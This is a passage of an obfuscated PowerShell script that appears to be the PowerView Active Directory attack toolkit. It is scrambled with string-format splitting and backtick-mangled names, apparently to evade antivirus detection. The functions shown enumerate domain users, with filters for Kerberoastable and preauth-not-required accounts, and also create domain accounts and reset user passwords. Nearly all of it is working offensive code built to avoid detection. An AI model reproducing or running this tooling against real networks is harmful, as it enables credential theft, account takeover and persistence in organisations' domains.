                if (${r`EFERE`N`ce`obJeCTP`Roper`TiES} -NotContains ${o`BjEctp`ROP`er`TY}) {
                    ${O`Ut} = &("{1}{0}{2}" -f 'Obje','New-','ct') ("{1}{0}{2}"-f'bjec','PSO','t')
                    ${o`Ut} | &("{2}{1}{0}" -f 'r','Membe','Add-') ("{3}{2}{1}{0}"-f 'y','rt','prope','Note') ("{3}{1}{0}{2}" -f 'unt','cco','Name','SamA') ${Ob`JE`CT}."sa`MAccoun`T`NAmE"
                    ${o`UT} | &("{1}{0}{2}" -f'd-Membe','Ad','r') ("{2}{0}{1}"-f 'ote','property','N') ("{1}{2}{0}" -f'rty','Pr','ope') ${obJEctp`Ro`pe`R`Ty}
                    ${O`UT} | &("{1}{0}{2}" -f'd-Me','Ad','mber') ("{0}{1}{2}{3}" -f'Note','pr','op','erty') ("{0}{1}" -f 'Val','ue') ${OBJE`cT}.${o`BJECTPrOPE`RTy}
                    ${O`UT}."pSo`BJect"."tYp`e`NAMes".("{1}{0}" -f'sert','In').Invoke(0, ("{0}{4}{2}{1}{3}" -f 'P','w.PropertyO','Vie','utlier','ower'))
                    ${o`Ut}
                }
            }
        }
    }
}

function gE`T-`doMaIN`US`ER {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{5}{6}{7}{2}{4}{1}{3}{0}"-f'ents','nAss','re','ignm','dVarsMoreTha','PSU','s','eDecla'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{2}{0}{4}" -f'uldProces','PS','ho','S','s'}, '')]
    [OutputType({"{2}{3}{0}{1}"-f 'erView.Us','er','P','ow'})]
    [OutputType({"{2}{3}{0}{1}{4}"-f 'w.','Us','PowerVi','e','er.Raw'})]
    [CmdletBinding(dEfaUltpARaMeterSEtnAME = {"{1}{0}{3}{2}" -f'owDe','All','on','legati'})]
    Param(
        [Parameter(PoSiTIon = 0, vALUEFROMpIPelINE = ${t`RUE}, vALUeFRomPIPelINEBYPROpERtYNAmE = ${T`RUE})]
        [Alias({"{3}{1}{0}{2}"-f'hedN','tinguis','ame','Dis'}, {"{1}{0}{2}"-f 'A','Sam','ccountName'}, {"{0}{1}"-f 'Na','me'}, {"{4}{2}{6}{1}{5}{0}{3}{7}"-f'uish','Dist','e','edNa','Memb','ing','r','me'}, {"{2}{0}{1}"-f 'em','berName','M'})]
        [String[]]
        ${I`DenTItY},

        [Switch]
        ${S`PN},

        [Switch]
        ${aDm`InCo`UNT},

        [Parameter(parAmEtErsETnaMe = "aL`L`oWDELEGat`iON")]
        [Switch]
        ${A`lL`OwDele`gATion},

        [Parameter(pArametERsETNAME = "dI`SalLO`WdELE`ga`TIOn")]
        [Switch]
        ${dIsA`L`LO`WdeLegatIoN},

        [Switch]
        ${Tr`UsTe`dtoAu`Th},

        [Alias({"{3}{0}{4}{5}{1}{7}{6}{2}"-f'ero','thNo','d','Kerb','s','Preau','ire','tRequ'}, {"{1}{0}"-f 'th','NoPreau'})]
        [Switch]
        ${PrE`AUtHno`T`RequIRed},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dom`AiN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}"-f 'r','Fi','lte'})]
        [String]
        ${L`DaPF`IltEr},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${p`ROPErT`iES},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}"-f 'th','a','ADSP'})]
        [String]
        ${Sea`Rch`B`ASe},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}" -f'inContr','Doma','oller'})]
        [String]
        ${s`erv`er},

        [ValidateSet({"{0}{1}" -f'B','ase'}, {"{0}{2}{1}" -f'OneLe','l','ve'}, {"{2}{0}{1}"-f 'ub','tree','S'})]
        [String]
        ${sear`CHsC`o`PE} = ("{1}{0}"-f 'e','Subtre'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rEsUlTP`Ag`E`si`ZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${Serv`eRtIMeLiM`IT},

        [ValidateSet({"{1}{0}"-f'cl','Da'}, {"{1}{0}" -f 'roup','G'}, {"{1}{0}" -f 'ne','No'}, {"{0}{1}" -f 'Own','er'}, {"{1}{0}" -f'acl','S'})]
        [String]
        ${seCU`Ri`T`yMaskS},

        [Switch]
        ${toM`BST`O`NE},

        [Alias({"{1}{2}{0}" -f'e','Retur','nOn'})]
        [Switch]
        ${Findo`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cre`d`E`NTIaL} =  ${Pk`Fezn}::"eMP`Ty",

        [Switch]
        ${r`Aw}
    )

    DynamicParam {
        ${uAcval`UENA`m`es} =   ( &("{2}{0}{1}" -f '-vaR','IaBLe','GEt')  ("{0}{1}" -f'Cj','I6k1')  -Va  )::("{2}{1}{0}"-f 'ames','N','Get').Invoke(${Ua`cEN`UM})

        ${u`ACvA`Lue`NaMEs} = ${UA`Cv`AL`UEnAMEs} | &("{0}{1}{2}" -f 'For','Ea','ch-Object') {${_}; "NOT_$_"}

        &("{2}{4}{5}{0}{6}{1}{3}" -f 'cPar','ete','Ne','r','w-Dyn','ami','am') -Name ("{1}{3}{0}{2}" -f'Filte','U','r','AC') -ValidateSet ${UAC`V`AlUE`N`AmES} -Type ([array])
    }

    BEGIN {
        ${sE`ArcH`ERArG`UM`EntS} = @{}
        if (${Psboun`DpAR`A`mETErS}[("{0}{1}"-f 'Doma','in')]) { ${S`EARchE`RaRGUMe`NTs}[("{1}{0}"-f 'omain','D')] = ${dO`MaiN} }
        if (${P`S`Bo`UndPARaMETErs}[("{1}{3}{0}{2}"-f 'ie','Pro','s','pert')]) { ${s`EArch`ERar`gumeNtS}[("{1}{2}{0}"-f'ties','Pro','per')] = ${pRopE`RT`iES} }
        if (${PSBo`UN`d`pAR`A`mETeRS}[("{1}{3}{0}{2}" -f 'rch','S','Base','ea')]) { ${sEAr`cHEr`ARGU`M`ENtS}[("{0}{2}{1}" -f'Searc','e','hBas')] = ${se`ARC`HbA`Se} }
        if (${pS`BOUNd`PArAMEt`ERS}[("{1}{0}{2}"-f 'r','Se','ver')]) { ${sEA`Rc`h`ERArgum`EntS}[("{0}{1}" -f'Se','rver')] = ${Se`Rv`eR} }
        if (${pSboUnd`PA`RAMeT`ERs}[("{2}{1}{0}"-f'ope','Sc','Search')]) { ${SEA`R`c`h`e`RArguMentS}[("{1}{3}{2}{0}" -f 'e','SearchS','p','co')] = ${SE`Arc`hscoPe} }
        if (${pSBo`UN`DPa`RAm`ete`Rs}[("{1}{2}{0}"-f 'e','Re','sultPageSiz')]) { ${seaRCH`Era`RguMeN`TS}[("{1}{3}{2}{0}"-f 'e','Resul','eSiz','tPag')] = ${REs`UL`T`pAGesi`zE} }
        if (${psbOU`N`Dpar`AME`TErs}[("{1}{2}{0}"-f 'meLimit','S','erverTi')]) { ${seA`Rc`HerA`RguME`Nts}[("{1}{2}{4}{0}{3}" -f'Lim','Ser','v','it','erTime')] = ${Se`RveRtI`m`ElIMit} }
        if (${P`s`BoUNDpA`Ra`MEt`eRS}[("{0}{1}{2}{3}" -f 'Sec','u','rity','Masks')]) { ${s`e`ArcHe`RarguME`N`Ts}[("{0}{1}{2}" -f'S','ec','urityMasks')] = ${s`E`C`URiTYmasks} }
        if (${P`s`BOUnD`pAraMeTERS}[("{0}{1}{2}{3}" -f'To','mb','s','tone')]) { ${SearCh`e`RA`R`gUm`Ents}[("{2}{1}{0}{3}" -f 'on','st','Tomb','e')] = ${ToM`Bsto`Ne} }
        if (${P`Sbou`N`dPArAMete`Rs}[("{1}{2}{0}"-f'ntial','Cred','e')]) { ${SEARC`hERa`RgUMen`Ts}[("{2}{3}{0}{1}"-f 'ia','l','Cr','edent')] = ${crE`d`eNTi`AL} }
        ${USERsE`A`RC`HER} = &("{1}{3}{4}{2}{0}"-f'her','G','rc','et-Doma','inSea') @SearcherArguments
    }

    PROCESS {

        if (${Ps`BouND`Pa`RametERs} -and (${P`S`B`OunDParaMeT`erS}."Co`Unt" -ne 0)) {
            &("{1}{0}{4}{6}{5}{3}{2}"-f'am','New-Dyn','eter','am','ic','ar','P') -CreateVariables -BoundParameters ${PSBo`UN`d`ParAm`eterS}
        }

        if (${useRS`earC`HeR}) {
            ${I`dEN`Tity`FILTeR} = ''
            ${f`i`ltEr} = ''
            ${iDE`NtiTy} | &("{3}{0}{1}{2}"-f '-Ob','j','ect','Where') {${_}} | &("{3}{2}{0}{1}"-f 'ch-Obj','ect','Ea','For') {
                ${iD`EntiTYI`N`STAn`ce} = ${_}.("{1}{0}{2}" -f'eplac','R','e').Invoke('(', '\28').("{1}{0}{2}" -f 'e','R','place').Invoke(')', '\29')
                if (${ideNt`I`Ty`INSTa`N`CE} -match ("{0}{1}" -f '^','S-1-')) {
                    ${I`dE`NTiTYfi`L`TEr} += "(objectsid=$IdentityInstance)"
                }
                elseif (${IdeNTitY`iN`s`TANcE} -match ("{1}{0}"-f 'N=','^C')) {
                    ${i`dENtITYFi`Lt`eR} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${PSBoU`NDPa`Ram`e`Te`RS}[("{1}{0}" -f 'ain','Dom')]) -and (-not ${PsB`OuNDp`Ar`AM`ETErs}[("{0}{1}{2}{3}"-f'Se','ar','ch','Base')])) {

                        ${IDE`NtItYd`Om`Ain} = ${ID`E`NTit`YIn`STanCe}.("{0}{1}{2}" -f 'Sub','Str','ing').Invoke(${iDE`NTi`T`yIN`sTaNcE}.("{0}{1}" -f'In','dexOf').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{0}{2}{1}" -f 'Write-','erbose','V') ('['+'G'+'et-D'+'omainUser'+'] '+'Ex'+'t'+'racte'+'d '+'do'+'ma'+'in '+"'$IdentityDomain' "+'from'+' '+"'$IdentityInstance'")
                        ${SE`ARchE`RArg`UmeNtS}[("{1}{0}" -f 'omain','D')] = ${iD`en`TI`T`ydomAIn}
                        ${usErsE`A`R`CHER} = &("{3}{1}{2}{0}" -f'archer','D','omainSe','Get-') @SearcherArguments
                        if (-not ${U`sErs`eARc`H`er}) {
                            &("{1}{2}{0}{3}" -f 'ar','Wr','ite-W','ning') ('[Ge'+'t-Domain'+'U'+'se'+'r'+'] '+'U'+'nable'+' '+'to'+' '+'r'+'etr'+'i'+'eve '+'do'+'main '+'se'+'arch'+'er'+' '+'f'+'or '+"'$IdentityDomain'")
                        }
                    }
                }
                elseif (${IdE`NT`i`TyINstANCe} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    ${g`U`IDBYT`es`TrIng} = (([Guid]${ID`ENTiTY`iNs`TancE}).("{1}{2}{3}{0}"-f'rray','T','o','ByteA').Invoke() | &("{1}{2}{3}{0}" -f't','For','Ea','ch-Objec') { '\' + ${_}.("{0}{2}{1}"-f 'ToS','ring','t').Invoke('X2') }) -join ''
                    ${iD`eNtIt`y`Filt`er} += "(objectguid=$GuidByteString)"
                }
                elseif (${i`DE`N`T`ItYIns`TaNCE}.("{1}{2}{0}"-f 'ins','Co','nta').Invoke('\')) {
                    ${coNVeRTediden`T`iTy`Ins`TANcE} = ${id`eN`TI`TYI`NstAn`Ce}.("{0}{1}"-f 'R','eplace').Invoke('\28', '(').("{1}{2}{0}" -f 'e','Repla','c').Invoke('\29', ')') | &("{3}{4}{0}{1}{2}"-f 'rt-ADN','am','e','Conv','e') -OutputType ("{0}{2}{1}"-f'Ca','nical','no')
                    if (${CONVERTedide`Nt`it`yiNStAN`ce}) {
                        ${useRDo`M`AiN} = ${C`onvEr`TEdI`DE`NTi`Ty`Ins`TAnCE}.("{2}{0}{1}"-f 'bStrin','g','Su').Invoke(0, ${cO`NVERTedI`d`en`TitYINs`Ta`NCE}.("{2}{1}{0}" -f 'dexOf','n','I').Invoke('/'))
                        ${u`sErnaMe} = ${I`D`eNTItyINsTa`NCE}.("{0}{1}" -f 'Sp','lit').Invoke('\')[1]
                        ${iDE`NT`i`TYFil`Ter} += "(samAccountName=$UserName)"
                        ${s`eArCheRA`Rgu`meN`Ts}[("{1}{0}"-f'omain','D')] = ${U`SerD`oM`AIN}
                        &("{0}{2}{1}{3}"-f'Wr','te-V','i','erbose') ('[Get-D'+'omai'+'nUser'+']'+' '+'Ex'+'t'+'rac'+'ted '+'do'+'main'+' '+"'$UserDomain' "+'fro'+'m '+"'$IdentityInstance'")
                        ${uS`ErSe`AR`C`hEr} = &("{1}{0}{2}{3}"-f 'ainS','Get-Dom','earc','her') @SearcherArguments
                    }
                }
                else {
                    ${IdEntiT`y`FiL`TER} += "(samAccountName=$IdentityInstance)"
                }
            }

            if (${I`dEnTI`TyFIL`Ter} -and (${ID`EN`Ti`TyF`iLter}.("{1}{0}"-f'm','Tri').Invoke() -ne '') ) {
                ${fi`lter} += "(|$IdentityFilter)"
            }

            if (${pSBO`UNd`PaRame`T`Ers}['SPN']) {
                &("{2}{1}{0}{3}"-f 'Verbo','-','Write','se') ("{5}{8}{9}{12}{6}{0}{10}{3}{2}{11}{1}{7}{4}{13}" -f '] Se','ull serv','ng f','chi','n','[Get','r','ice pri','-Dom','ain','ar','or non-n','Use','cipal names')
                ${Fil`TEr} += ("{1}{2}{0}{3}{4}{5}{6}" -f'Pr','(','service','i','n','cipalName','=*)')
            }
            if (${PSbOuNdp`Ara`m`ET`ERs}[("{2}{0}{3}{1}{4}"-f 'lo','Del','Al','w','egation')]) {
                &("{1}{2}{3}{0}" -f 'e','Wri','te-','Verbos') ("{10}{13}{8}{12}{9}{3}{0}{1}{2}{4}{7}{6}{11}{5}" -f'u','ser','s who can','r ',' ','ated','dele','be ','er] Search','o','[Get-Dom','g','ing f','ainUs')

                ${F`ILT`eR} += (("{13}{3}{4}{1}{6}{11}{5}{10}{0}{14}{7}{8}{2}{9}{12}" -f '3556.1.4','rol','1','(use','rAccountCont','.1',':1.2.',':','=','04','1','840','8574))','(!','.803'))
            }
            if (${p`SBouN`dpAR`A`meteRS}[("{1}{3}{4}{5}{2}{0}"-f'n','D','o','i','sal','lowDelegati')]) {
                &("{1}{3}{2}{0}" -f'se','W','te-Verbo','ri') ("{13}{21}{15}{17}{2}{16}{22}{9}{12}{8}{7}{0}{18}{14}{19}{1}{11}{20}{6}{10}{5}{3}{4}"-f ' ','ensitive ','er]','egat','ion','for del','t ','or users who',' f','rc','trusted ','an','hing','[G',' ','t',' Se','-DomainUs','are','s','d no','e','a')
                ${Fi`L`Ter} += ("{3}{1}{0}{6}{5}{2}{4}{7}{8}{9}"-f'untCont','serAcco','.','(u','4.8','113556.1','rol:1.2.840.','03',':=','1048574)')
            }
            if (${p`s`B`OUND`PaRAmETerS}[("{2}{1}{3}{0}"-f't','o','AdminC','un')]) {
                &("{0}{1}{3}{2}"-f 'Writ','e','e','-Verbos') ("{2}{7}{3}{5}{0}{6}{4}{9}{1}{8}" -f 'ser','ching for adminCount','[','-Domai',' Se','nU',']','Get','=1','ar')
                ${fi`ltER} += (("{2}{4}{1}{3}{0}" -f'1)','ount','(ad','=','minc'))
            }
            if (${psbouNd`Par`Ame`Ters}[("{2}{1}{3}{0}" -f'h','tedToA','Trus','ut')]) {
                &("{1}{2}{0}"-f 'se','Write','-Verbo') ("{4}{12}{13}{5}{3}{14}{1}{8}{9}{19}{17}{16}{7}{6}{2}{10}{18}{11}{15}{0}"-f'ls','r','thenticate for ot','] Se','[Ge','nUser','to au','sted ','ching ','for users ','he','prin','t-Do','mai','a','cipa','are tru','hat ','r ','t')
                ${f`Ilter} += (("{4}{6}{5}{0}{3}{1}{7}{2}" -f'lo','d','=*)','we','(ms','al','ds-','todelegateto'))
            }
            if (${pSbo`UNDP`Ar`A`METeRS}[("{1}{0}{3}{2}"-f 'eauth','Pr','tRequired','No')]) {
                &("{0}{2}{3}{1}"-f 'Wr','se','ite-Ver','bo') ("{7}{4}{0}{21}{1}{15}{14}{24}{16}{11}{13}{6}{18}{8}{17}{3}{22}{20}{9}{2}{12}{19}{23}{5}{10}"-f 't-','r','s','d','Ge','nticat','ount','[','at',' kerbero','e','er a',' ','cc',' Sear',']','ing for us',' ','s th','preaut',' not require','DomainUse','o','he','ch')
                ${Fil`T`ER} += (("{10}{7}{3}{8}{0}{2}{9}{6}{4}{1}{5}"-f 'l:1.2','4194304','.840.113556.1.4','nt','=',')','03:','untCo','ro','.8','(userAcco'))
            }
            if (${PSBOUndP`AR`Am`ETE`Rs}[("{2}{1}{3}{0}" -f'er','A','LD','PFilt')]) {
                &("{2}{0}{1}{3}"-f'rite-','V','W','erbose') ('['+'G'+'et-Dom'+'ainUser]'+' '+'U'+'si'+'ng '+'a'+'ddi'+'tio'+'nal '+'LD'+'AP '+'f'+'ilte'+'r: '+"$LDAPFilter")
                ${Fi`LT`er} += "$LDAPFilter"
            }

            ${UAC`F`iLtER} | &("{1}{0}{2}" -f'-Obje','Where','ct') {${_}} | &("{2}{3}{1}{0}"-f 'ct','e','Fo','rEach-Obj') {
                if (${_} -match ("{1}{0}"-f'*','NOT_.')) {
                    ${UAC`FI`eLD} = ${_}.("{0}{2}{1}" -f'S','ing','ubstr').Invoke(4)
                    ${U`AcVA`LUE} = [Int](${UaC`en`UM}::${u`A`cFIeLd})
                    ${fil`TeR} += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    ${uA`CV`ALuE} = [Int](${u`ACEN`UM}::${_})
                    ${Fi`lTER} += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            ${us`ERsEARc`HER}."F`ILter" = "(&(samAccountType=805306368)$Filter)"
            &("{0}{1}{2}" -f'W','rite-Ve','rbose') "[Get-DomainUser] filter string: $($UserSearcher.filter) "

            if (${ps`B`oUndparAmEt`ers}[("{2}{0}{1}" -f 'n','e','FindO')]) { ${rE`su`lTs} = ${uSerSEA`Rc`HeR}.("{0}{1}" -f'F','indOne').Invoke() }
            else { ${Re`S`UlTS} = ${UsersE`ARc`Her}.("{0}{1}{2}"-f 'F','ind','All').Invoke() }
            ${rEs`UL`Ts} | &("{0}{1}{2}{3}"-f 'Where','-O','bjec','t') {${_}} | &("{3}{0}{1}{2}"-f 'ch-','Ob','ject','ForEa') {
                if (${PS`BouN`DpARa`mETE`Rs}['Raw']) {

                    ${U`SeR} = ${_}
                    ${U`seR}."P`sObJ`ecT"."t`ypEna`mEs".("{2}{1}{0}" -f'ert','s','In').Invoke(0, ("{1}{4}{0}{2}{3}"-f'iew.U','Power','ser','.Raw','V'))
                }
                else {
                    ${us`eR} = &("{3}{4}{5}{1}{0}{2}" -f'rope','APP','rty','Co','n','vert-LD') -Properties ${_}."pROP`eRT`IeS"
                    ${U`sEr}."P`s`oBJEct"."tYP`ENaM`Es".("{1}{0}"-f't','Inser').Invoke(0, ("{2}{1}{4}{3}{0}" -f 'ser','w','Po','w.U','erVie'))
                }
                ${U`SER}
            }
            if (${Re`s`Ults}) {
                try { ${r`E`sUlTS}.("{0}{1}" -f'di','spose').Invoke() }
                catch {
                    &("{2}{0}{1}" -f'e-V','erbose','Writ') ('[Ge'+'t-Domai'+'nUse'+'r] '+'Error'+' '+'di'+'sposi'+'ng '+'o'+'f '+'th'+'e '+'Re'+'su'+'lts '+'obj'+'ect'+': '+"$_")
                }
            }
            ${usErs`E`ArC`HeR}.("{1}{0}{2}"-f'pos','dis','e').Invoke()
        }
    }
}

function NE`w-do`MaINu`Ser {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{9}{8}{3}{1}{5}{6}{4}{7}{0}"-f'ns','s','PSUse','oces','gingFun','ForStat','eChan','ctio','Pr','Should'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{1}" -f'P','ShouldProcess','S'}, '')]
    [OutputType({"{12}{7}{3}{0}{9}{4}{1}{10}{2}{5}{6}{8}{11}"-f'rvices','na','t.Us','Se','ountMa','er','P','y','r','.Acc','gemen','incipal','Director'})]
    Param(
        [Parameter(mANDATorY = ${T`RuE})]
        [ValidateLength(0, 256)]
        [String]
        ${Sa`maC`coU`NtNAMe},

        [Parameter(MAndATORy = ${Tr`Ue})]
        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}"-f'o','rd','Passw'})]
        [Security.SecureString]
        ${A`ccouN`Tp`ASSWORd},

        [ValidateNotNullOrEmpty()]
        [String]
        ${N`AME},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`iSPlA`YNAME},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DE`scr`IPT`Ion},

        [ValidateNotNullOrEmpty()]
        [String]
        ${do`MA`iN},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CReD`enTI`Al} =  (  &("{1}{3}{0}{2}"-f'r','GET-','IAble','VA')  ("P"+"KFeZN") )."Va`luE"::"eMP`TY"
    )

    ${Co`NTexT`ArG`UMe`NtS} = @{
        ("{2}{0}{1}"-f 't','y','Identi') = ${SaMaCCOU`N`T`NAme}
    }
    if (${pSB`ounDPARAm`E`Te`Rs}[("{1}{0}" -f'omain','D')]) { ${Co`NTEXTA`RguMEn`Ts}[("{1}{0}{2}"-f 'a','Dom','in')] = ${DO`MAin} }
    if (${P`sbOUn`DPa`RA`M`eTers}[("{1}{2}{3}{0}" -f 'l','Cr','edenti','a')]) { ${conTeX`T`A`RguM`E`Nts}[("{1}{2}{0}"-f'ential','Cre','d')] = ${C`ReD`ENTI`Al} }
    ${Co`N`TExt} = &("{2}{1}{4}{0}{3}" -f 'lConte','Princip','Get-','xt','a') @ContextArguments

    if (${cOnte`Xt}) {
        ${u`sEr} = &("{0}{1}{2}" -f'New-Ob','jec','t') -TypeName ("{8}{7}{0}{2}{4}{5}{9}{11}{10}{6}{3}{1}"-f'ectoryService','incipal','s.AccountMana','rPr','ge','m','se','tem.Dir','Sys','e','.U','nt') -ArgumentList (${Co`NtExt}."c`on`TEXt")

        ${u`seR}."sA`MacCoUnt`Na`Me" = ${C`oN`TeXT}."I`Den`TIty"
        ${tEM`p`cred} = &("{1}{0}{2}" -f 'je','New-Ob','ct') ("{9}{1}{6}{12}{4}{2}{8}{3}{0}{11}{10}{5}{7}"-f 'o','a','Auto','ati','ent.','e','n','ntial','m','System.M','SCred','n.P','agem')('a', ${a`ccouN`T`Pa`sSwORD})
        ${uS`er}.("{2}{1}{0}{3}" -f'asswor','tP','Se','d').Invoke(${Te`mPcr`Ed}.("{0}{4}{1}{3}{2}"-f 'GetNet','rkCrede','al','nti','wo').Invoke()."P`ASSW`ORD")
        ${us`ER}."Ena`BL`Ed" = ${tR`Ue}
        ${u`seR}."PAs`SwORdN`otREqUIR`ED" = ${fA`lSE}

        if (${P`sb`Oun`dPaRAMetErs}[("{1}{0}" -f 'ame','N')]) {
            ${u`ser}."NA`ME" = ${n`Ame}
        }
        else {
            ${U`SeR}."NA`mE" = ${CO`NtE`Xt}."IdEnt`i`Ty"
        }
        if (${p`SbOU`NDpARAME`T`ERs}[("{0}{2}{1}{3}"-f 'Disp','Na','lay','me')]) {
            ${u`sEr}."di`sPLAyN`A`me" = ${diSpl`Ayn`A`me}
        }
        else {
            ${u`SER}."DisPL`Ayna`me" = ${CO`NT`ExT}."i`dent`ity"
        }

        if (${Ps`BounDparaMet`e`Rs}[("{1}{2}{0}" -f'ion','De','script')]) {
            ${uS`ER}."D`Es`CRiP`TION" = ${d`E`sCr`iptiOn}
        }

        &("{2}{3}{0}{1}{4}"-f't','e-Verbos','Wr','i','e') ('['+'N'+'ew-D'+'omai'+'nU'+'ser] '+'Attemp'+'t'+'ing'+' '+'t'+'o '+'crea'+'te '+'us'+'er '+"'$SamAccountName'")
        try {
            ${nU`lL} = ${Us`er}.("{1}{0}" -f've','Sa').Invoke()
            &("{1}{0}{2}{3}{4}"-f'r','W','i','te-Ver','bose') ('[New'+'-D'+'om'+'ain'+'User] '+'Us'+'er '+"'$SamAccountName' "+'successf'+'ully'+' '+'cre'+'at'+'ed')
            ${U`sEr}
        }
        catch {
            &("{1}{2}{0}{3}"-f 'n','W','rite-War','ing') ('[N'+'ew'+'-Doma'+'inUser] '+'Err'+'or '+'creat'+'i'+'ng '+'us'+'er '+"'$SamAccountName' "+': '+"$_")
        }
    }
}

function s`et-dom`AINU`Ser`PAS`S`Word {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{6}{3}{0}{4}{1}{2}{8}{7}{9}{5}" -f'Shou','dProces','sForSta','Use','l','ns','PS','ging','teChan','Functio'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{3}{2}" -f 'S','PS','ss','houldProce'}, '')]
    [OutputType({"{12}{1}{7}{0}{2}{4}{6}{5}{3}{8}{10}{11}{13}{9}" -f 'vices','torySe','.','Managem','A','ount','cc','r','en','l','t.UserP','rin','Direc','cipa'})]
    Param(
        [Parameter(PositIon = 0, MandATory = ${TR`UE})]
        [Alias({"{0}{1}" -f'UserNa','me'}, {"{0}{2}{1}"-f 'Use','tity','rIden'}, {"{1}{0}"-f 'ser','U'})]
        [String]
        ${id`eNtI`Ty},

        [Parameter(manDAToRy = ${Tr`UE})]
        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}" -f 'wo','Pass','rd'})]
        [Security.SecureString]
        ${AccouN`TPa`ss`woRD},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DO`MA`IN},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`RE`dentIAL} =  (&("{2}{1}{0}" -f 'ble','T-varIa','gE')  ('pkf'+'Ez'+'N') )."vA`Lue"::"Em`PTY"
    )

    ${ConT`ex`T`ARgU`menTs} = @{ ("{2}{1}{0}" -f 'ity','dent','I') = ${I`dEnt`Ity} }
    if (${PSb`OuNd`PaRAme`TeRS}[("{1}{0}{2}" -f'mai','Do','n')]) { ${CO`NT`eXT`ARGU`MeNTs}[("{1}{0}"-f'in','Doma')] = ${doM`AiN} }
    if (${psbO`U`NDpaRAMeTe`Rs}[("{1}{2}{0}" -f 'ntial','Cred','e')]) { ${Co`NText`ArGUme`N`Ts}[("{2}{1}{3}{0}"-f'l','re','C','dentia')] = ${credeN`T`IaL} }
    ${cO`NTEXT} = &("{2}{1}{4}{3}{0}"-f'alContext','t-P','Ge','ip','rinc') @ContextArguments

    if (${c`o`NteXt}) {
        ${U`SER} = [System.DirectoryServices.AccountManagement.UserPrincipal]::("{0}{3}{1}{2}" -f'FindByIde','ti','ty','n').Invoke(${Con`T`EXT}."cO`NText", ${I`DEnT`itY})

        if (${uS`Er}) {
            &("{1}{0}{2}" -f'ite','Wr','-Verbose') ('[Set-Domai'+'nUser'+'Password'+']'+' '+'At'+'t'+'empting '+'t'+'o '+'se'+'t '+'th'+'e '+'pa'+'ssword'+' '+'for'+' '+'user'+' '+"'$Identity'")
            try {
                ${tEm`PC`RED} = &("{0}{1}{2}" -f'New-O','b','ject') ("{0}{5}{9}{8}{2}{4}{6}{3}{7}{1}" -f 'System','ial','n','Cred','.','.','PS','ent','o','Management.Automati')('a', ${ACCOUN`T`pA`Ssw`oRd})
                ${uS`er}.("{0}{2}{3}{1}"-f'Se','rd','tP','asswo').Invoke(${t`empcr`eD}.("{2}{3}{1}{0}"-f 'l','ia','GetNetworkCreden','t').Invoke()."paSSwo`RD")

                ${NU`ll} = ${US`eR}.("{0}{1}" -f 'Sa','ve').Invoke()
                &("{0}{1}{3}{2}{4}"-f'Writ','e','bos','-Ver','e') ('['+'Se'+'t-D'+'o'+'mainUserPa'+'sswor'+'d] '+'Pas'+'sword'+' '+'for'+' '+'use'+'r '+"'$Identity' "+'s'+'uccessf'+'ull'+'y '+'rese'+'t')
            }
            catch {
                &("{0}{1}{4}{3}{2}" -f'Wri','t','arning','W','e-') ('[S'+'et-'+'DomainUserPa'+'s'+'swo'+'rd'+']'+' '+'Er'+'ror'+' '+'se'+'tt'+'ing '+'passw'+'o'+'rd '+'f'+'or '+'user'+' '+"'$Identity' "+': '+"$_")
            }
        }
        else {
            &("{2}{0}{1}{3}" -f 'n','in','Write-War','g') ('['+'S'+'et-D'+'o'+'mainUserPasswo'+'r'+'d] '+'Unabl'+'e '+'to'+' '+'f'+'ind '+'us'+'er '+"'$Identity'")
        }
    }
}

function Get`-`DomaINU`Se`ReveNt {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{2}{0}{1}{3}"-f 'dProc','es','ul','s','PSSho'}, '')]
    [OutputType({"{6}{0}{5}{3}{2}{1}{4}"-f'iew.L','v','onE','g','ent','o','PowerV'})]
    [OutputType({"{2}{8}{5}{7}{0}{6}{3}{1}{4}" -f 'tCredent','nEv','Pow','Logo','ent','ic','ial','i','erView.Expl'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOsItIoN = 0, ValuEFromPipeLiNE = ${TR`UE}, valuEfrompIPeliNeByprOpERtYNaME = ${TR`Ue})]
        [Alias({"{1}{2}{0}" -f'me','dns','hostna'}, {"{1}{2}{0}"-f 'e','HostN','am'}, {"{0}{1}"-f'na','me'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${CompUTE`R`Na`ME} = ${eN`V:cOMP`UTErnA`ME},

        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${S`TAr`TtiMe} =   ${0`Do}::"N`ow".("{1}{0}"-f's','AddDay').Invoke(-1),

        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${En`Dt`ImE} =   (  &("{1}{0}" -f'IablE','Var') ("0"+"Do")  )."va`lUe"::"N`ow",

        [ValidateRange(1, 1000000)]
        [Int]
        ${MA`xEVeN`TS} = 5000,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
